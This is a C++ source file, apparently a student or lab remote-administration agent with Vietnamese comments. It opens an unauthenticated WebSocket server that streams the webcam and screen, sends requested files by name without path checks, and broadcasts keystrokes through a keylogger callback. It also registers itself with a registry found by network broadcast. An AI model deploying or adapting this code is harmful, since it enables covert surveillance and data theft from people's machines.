// 1. Cấu hình định nghĩa cho Windows (Phải đặt trên cùng)
#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN // Giảm kích thước header Windows
    #endif
    #include <windows.h>      
#else
    #include <unistd.h>
    #include <limits.h>
    #include <netdb.h>        // Cho gethostname trên Linux
    #include <arpa/inet.h>    // Cho inet_ntoa
#endif

// 2. Các thư viện C++ chuẩn và Boost
#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/ip/udp.hpp> 
#include <boost/asio/ip/host_name.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <algorithm>
#include <nlohmann/json.hpp>

// 3. Include các module của dự án
#include "src/core/CommandDispatcher.hpp"
#include "src/interfaces/IRemoteModule.hpp"
#include "src/modules/KeyManager.hpp"
#include "src/modules/WebcamManager.hpp"
#include "src/modules/ScreenManager.hpp" 
#include "src/modules/ProcessManager.hpp"
#include "src/modules/FileManager.hpp"

#include <boost/beast/http.hpp>
#include <chrono>

namespace beast     = boost::beast;
namespace websocket = beast::websocket;
namespace net       = boost::asio;
using tcp           = net::ip::tcp;
using udp           = net::ip::udp;
using json          = nlohmann::json;
namespace http      = boost::beast::http;

// ==================== GLOBALS ====================
static std::mutex cout_mtx;
KeyManager keyManager;
CommandDispatcher g_dispatcher;

// Adapter cho KeyManager
class KeyManagerAdapter : public IRemoteModule {
public:
    const std::string& get_module_name() const override { 
        static const std::string name = "KEYBOARD"; return name; 
    }
    json handle_command(const json& request) override { return keyManager.handle_command(request); }
};

// ==================== HELPER FUNCTIONS (Đa nền tảng) ====================

// Hàm lấy tên máy tính
std::string get_computer_name() {
#ifdef _WIN32
    char buf[256];
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size)) {
        return std::string(buf);
    }
    return "UNKNOWN-WIN-PC";
#else
    char hostname[HOST_NAME_MAX];
    if (gethostname(hostname, HOST_NAME_MAX) == 0) {
        return std::string(hostname);
    }
    return "UNKNOWN-LINUX-PC";
#endif
}

// Hàm lấy IP LAN (Dùng Boost Asio để chạy trên mọi nền tảng)
std::string get_local_ip() {
    try {
        net::io_context io_context;
        udp::resolver resolver(io_context);
        
        // [FIX] Boost mới không dùng resolver::query nữa.
        // Thay vào đó, truyền tham số trực tiếp vào hàm resolve().
        auto endpoints = resolver.resolve(udp::v4(), "8.8.8.8", "80");
        
        if (endpoints.begin() != endpoints.end()) {
            udp::endpoint ep = *endpoints.begin();
            udp::socket socket(io_context);
            socket.connect(ep);
            return socket.local_endpoint().address().to_string();
        }
    } catch (...) {
        return "127.0.0.1";
    }
    return "127.0.0.1";
}

// Hàm lấy tên hệ điều hành
std::string get_os_name() {
#ifdef _WIN32
    return "Windows";
#elif __linux__
    return "Linux";
#else
    return "Unknown OS";
#endif
}

// ==================== SESSION MANAGER & LOGIC ====================
// Logic này giữ nguyên, chỉ đảm bảo include headers đúng

class SessionManager {
public:
    void join(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.push_back(ws);
    }
    void leave(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
    }
    void broadcast(const std::string& message) {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto* ws : sessions_) {
            try {
                // Kiểm tra socket còn mở trước khi gửi
                if(ws->is_open()) {
                    ws->text(true);
                    ws->write(net::buffer(message));
                }
            } catch (...) {}
        }
    }
private:
    std::vector<websocket::stream<tcp::socket>*> sessions_;
    std::mutex mutex_;
};
static SessionManager g_sessionManager;

void do_session(tcp::socket s) {
    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s));
    auto ws_mutex = std::make_shared<std::mutex>();

    try {
        std::string client_ip = ws->next_layer().remote_endpoint().address().to_string();
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cout << "[SESSION] CONNECTED: " << client_ip << "\n"; }

        ws->accept();
        g_sessionManager.join(ws.get());

        for (;;) {
            beast::flat_buffer buffer;
            ws->read(buffer);
            
            std::string req_str = beast::buffers_to_string(buffer.data());
            json request, response;

            try {
                request = json::parse(req_str);
                std::string module = request.value("module", "");
                std::string cmd = request.value("command", "");

                // --- MODULE: WEBCAM ---
                if (module == "WEBCAM") {
                    auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"));
                    if (cam) {
                        if (cmd == "START_STREAM") {
                            std::cout << "[MAIN] Webcam Stream Started\n";
                            cam->start_stream([ws, ws_mutex](const std::vector<uint8_t>& data) {
                                std::lock_guard<std::mutex> lock(*ws_mutex);
                                try {
                                    if(ws->is_open()) {
                                        ws->binary(true);
                                        ws->write(net::buffer(data.data(), data.size()));
                                    }
                                } catch (...) {}
                            });
                            response = {{"status", "success"}, {"message", "Stream Started"}};
                        } 
                        else if (cmd == "STOP_STREAM") {
                            cam->stop_stream();
                            response = {{"status", "success"}, {"message", "Stream Stopped"}};
                        }
                    }
                } 
                // --- MODULE: SCREENSHOT ---
                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") {
                    std::vector<uint8_t> jpg_data;
                    std::string err;
                    
                    bool should_save = true;

                    if (request.contains("payload") && request["payload"].contains("save")) {
                        should_save = request["payload"]["save"].get<bool>();
                    }   

                    if (ScreenManager::capture_screen_data(jpg_data, err, should_save)) {
                        {
                            std::lock_guard<std::mutex> lock(*ws_mutex);
                            ws->binary(true);
                            ws->write(net::buffer(jpg_data.data(), jpg_data.size()));
                        }
                        // Chỉ gửi phản hồi text nếu CÓ lưu file (để đỡ spam log client)
                        if (should_save) {
                            response = {{"module", "SCREEN"}, {"command", "CAPTURE_COMPLETE"}, {"status", "success"}};
                        } else {
                            // Khi stream thì không cần gửi JSON phản hồi, chỉ gửi ảnh là đủ
                            continue; 
                        }
                    } else {
                        response = {{"status", "error"}, {"message", err}};
                    }
                }
                // --- [MỚI] MODULE: FILE MANAGER ---
                else if (module == "FILE") {
                    if (cmd == "GET") {
                        // Xử lý gửi file nhị phân (Binary)
                        std::string filename = "";
                        if (request.contains("payload") && request["payload"].contains("name")) {
                            filename = request["payload"]["name"];
                        }

                        std::vector<uint8_t> file_data;
                        // Gọi hàm static từ FileManager
                        if (!filename.empty() && FileManager::read_file_binary(filename, file_data)) {
                            {
                                std::lock_guard<std::mutex> lock(*ws_mutex);
                                ws->binary(true); // Chuyển sang chế độ gửi Binary
                                ws->write(net::buffer(file_data.data(), file_data.size()));
                            }
                            // Thông báo JSON sau khi gửi file xong (Client có thể dùng hoặc bỏ qua)
                            response = {{"status", "success"}, {"command", "GET_COMPLETE"}, {"file", filename}};
                            std::cout << "[FILE] Sent: " << filename << "\n";
                        } else {
                            response = {{"status", "error"}, {"message", "File not found or empty name"}};
                        }
                    } else {
                        // Lệnh LIST xử lý qua Dispatcher (trả về JSON)
                        response = g_dispatcher.dispatch(request);
                    }
                }
                // --- OTHER MODULES ---
                else {
                    response = g_dispatcher.dispatch(request);
                }

            } catch (const std::exception& e) {
                response = {{"status", "error"}, {"message", e.what()}};
            }

            // Gửi phản hồi JSON (Text)
            {
                std::lock_guard<std::mutex> lock(*ws_mutex);
                ws->text(true);
                ws->write(net::buffer(response.dump()));
            }
        }

    } catch (const std::exception& e) {
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cerr << "[SESSION END] " << e.what() << "\n"; }
        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) {
            cam->stop_stream();
        }
    }
    g_sessionManager.leave(ws.get());
}

// ==================== REGISTRY & DISCOVERY (UDP) ====================
static std::string registry_host = "";

std::string udp_discover_registry() {
    try {
        net::io_context io;
        udp::socket socket(io);
        socket.open(udp::v4());
        socket.set_option(udp::socket::reuse_address(true));
        socket.set_option(net::socket_base::broadcast(true));
        socket.bind(udp::endpoint(udp::v4(), 0));

        udp::endpoint broadcast_ep(net::ip::address_v4::broadcast(), 8888);
        std::string msg = "DISCOVER_REGISTRY";
        socket.send_to(net::buffer(msg), broadcast_ep);

        char data[256] = {};
        udp::endpoint sender;
        
        socket.non_blocking(true); 
        
        // Thử nhận phản hồi trong 3 giây
        for (int i = 0; i < 30; i++) { 
            boost::system::error_code ec;
            size_t len = socket.receive_from(net::buffer(data), sender, 0, ec);
            
            if (!ec && len > 0) {
                std::string reply(data, len);
                if (reply.find("REGISTRY_IP:") == 0)
                    return reply.substr(12);
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Cross-platform sleep
        }
    } catch (...) {}
    return "";
}

void registerToRegistry() {
    try {
        net::io_context ctx;
        tcp::resolver resolver(ctx);
        beast::tcp_stream stream(ctx);

        auto const results = resolver.resolve(registry_host, "3000");
        stream.connect(results);

        json body = {
            {"machineId", get_computer_name()},
            {"ip", get_local_ip()},
            {"os", get_os_name()},
            {"wsPort", 9010},
            {"tags", json::array({"lab", "student"})}
        };

        http::request<http::string_body> req{ http::verb::post, "/api/agents/register", 11 };
        req.set(http::field::host, registry_host);
        req.set(http::field::content_type, "application/json");
        req.body() = body.dump();
        req.prepare_payload();

        http::write(stream, req);
        
        beast::flat_buffer buffer;
        http::response<http::string_body> res;
        http::read(stream, buffer, res);
        
        stream.socket().shutdown(tcp::socket::shutdown_both);
        std::cout << "[REGISTRY] Registered successfully to " << registry_host << "\n";
    } catch (const std::exception& e) {
        std::cout << "[REGISTRY] Register ERROR: " << e.what() << "\n";
    }
}

void sendHeartbeat() {
    try {
        net::io_context ctx;
        tcp::resolver resolver(ctx);
        beast::tcp_stream stream(ctx);

        auto const results = resolver.resolve(registry_host, "3000");
        stream.connect(results);

        json body = { {"machineId", get_computer_name()} };

        http::request<http::string_body> req{ http::verb::post, "/api/agents/heartbeat", 11 };
        req.set(http::field::host, registry_host);
        req.set(http::field::content_type, "application/json");
        req.body() = body.dump();
        req.prepare_payload();

        http::write(stream, req);
        
        beast::flat_buffer buffer;
        http::response<http::string_body> res;
        http::read(stream, buffer, res);
        
        stream.socket().shutdown(tcp::socket::shutdown_both);
    } catch (...) {}
}

// ==================== MAIN ====================
int main() {
    // [MỚI] Fix lỗi lệch chuột trên màn hình High DPI
    #ifdef _WIN32
        SetProcessDPIAware(); 
    #endif

    // Chỉ set font console trên Windows
    #ifdef _WIN32
    SetConsoleOutputCP(CP_UTF8);
    #endif

    std::cout << "=== REMOTE SERVER [" << get_os_name() << "] ===\n";

    g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());
    
    // Keylogger Callback
    KeyManager::set_callback([&](std::string key_char) {
        json msg; 
        msg["module"] = "KEYBOARD"; 
        msg["command"] = "PRESS"; 
        msg["data"] = { {"key", key_char} };
        g_sessionManager.broadcast(msg.dump());
    });

    // 1. Tìm Registry Server
    std::cout << "[DISCOVERY] Searching for Registry...\n";
    registry_host = udp_discover_registry();

    if (registry_host.empty()) {
        std::cout << "[WARN] Registry NOT found. Standalone mode.\n";
    } else {
        std::cout << "[INFO] Found Registry at: " << registry_host << "\n";
        registerToRegistry();
        
        // Tạo thread heartbeat
        std::thread([]() {
            while (true) {
                sendHeartbeat();
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }).detach();
    }

    // 2. Mở Server WebSocket
    try {
        net::io_context ioc{1};
        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}};
        std::cout << "[SERVER] Listening on port 9010...\n";

        for (;;) {
            tcp::socket socket{ioc};
            acceptor.accept(socket);
            std::thread(do_session, std::move(socket)).detach();
        }
    } catch (const std::exception& e) {
        std::cerr << "[FATAL] " << e.what() << "\n";
    }
    return 0;
}
